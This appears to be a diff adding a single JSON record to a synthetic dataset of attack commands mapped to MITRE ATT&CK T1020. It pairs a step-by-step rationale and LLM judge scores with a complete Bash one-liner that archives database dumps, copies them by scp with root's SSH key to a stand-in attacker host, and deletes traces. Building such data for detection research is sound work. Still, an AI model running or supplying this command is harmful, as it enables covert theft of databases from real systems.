@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1020",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "ts=$(date +%s); find /var/backups -type f \\( -name '*.sql' -o -name '*.sql.gz' -o -name '*.dump' \\) -print0 | tar --null -T - -czf /tmp/dbdumps_${ts}.tgz >/dev/null 2>&1 && scp -q -C -i /root/.ssh/id_rsa -P 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null /tmp/dbdumps_${ts}.tgz attacker@198.51.100.10:/var/tmp/.cache/db/ >/dev/null 2>&1 && rm -f /tmp/dbdumps_${ts}.tgz",
+  "explanation": "Finds common database dump files, compresses them into a single archive, and quietly exfiltrates using scp with non-interactive authentication.",
+  "rationale_steps": [
+    "Search backup locations for SQL dump patterns to target valuable data.",
+    "Create a compressed tarball to minimize size and number of transfer operations.",
+    "Exfiltrate with scp using SSH keys to avoid prompts and logs.",
+    "Suppress output and remove temporary files to reduce detection footprint."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1020-e93662d8-261e7fdf",
+  "source_prompt_hash": "e93662d8",
+  "timestamp_utc": "2025-09-30T09:01:25.255647Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed Bash pipeline with balanced quoting/parentheses, valid find/tar/scp flags, proper separators, and correct redirections.",
+        "semantic_score": 4,
+        "semantic_justification": "Command automates collection, compression, exfiltration via scp, and cleanup consistent with T1020, but assumes access to /var/backups and /root/.ssh/id_rsa despite 'Privilege: None', reducing realism.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T02:52:23.780565Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators (&&), valid flags for all tools used (find, tar, scp, rm), and correct escape sequences.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with the T1020 Automated Exfiltration technique by finding database dumps, packaging them with tar, transferring them via scp to an external server, and cleaning up traces afterward.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T02:52:26.706448Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct syntax, balanced elements, valid flags, and proper command separators.",
+        "semantic_score": 4,
+        "semantic_justification": "The command effectively implements the T1020 technique of automated exfiltration, but the use of `/root/.ssh/id_rsa` for authentication is inconsistent with the stated 'Privilege: None' for a standard unprivileged user.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T05:34:31.967869Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
